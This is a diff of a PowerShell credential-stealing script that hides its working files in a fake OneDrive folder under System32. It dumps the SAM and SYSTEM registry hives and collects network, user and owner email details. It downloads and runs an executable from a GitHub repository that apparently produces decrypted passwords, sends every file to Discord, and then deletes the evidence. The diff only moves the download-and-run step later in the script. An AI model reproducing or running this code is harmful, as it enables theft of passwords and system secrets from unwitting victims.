@@ -1,13 +1,9 @@
 cd $env:SystemRoot\System32\Microsoft_OneDrive\BQ
-iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe
-start-sleep 5
-Start-process "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe"
 ipconfig /all | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
 net user | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
 Get-Computerinfo -Property "*Owner" | Out-file -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\email.txt
 reg save HKLM\sam ./sam.save
 reg save HKLM\system ./system.save
-start-sleep 15
 
 
 function Upload-Discord {
@@ -63,7 +59,6 @@ Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\user.txt
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\email.txt
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
-Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\decrypted_password.csv
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save
 
@@ -74,9 +69,17 @@ rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt" -r -Force -ErrorAc
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save" -r -Force -ErrorAction SilentlyContinue
+
+
+
+iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe
+Start-process "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe"
+start-sleep 7
+
+
+Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\decrypted_password.csv
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
-
 
 function Clean-Exfil { 
 
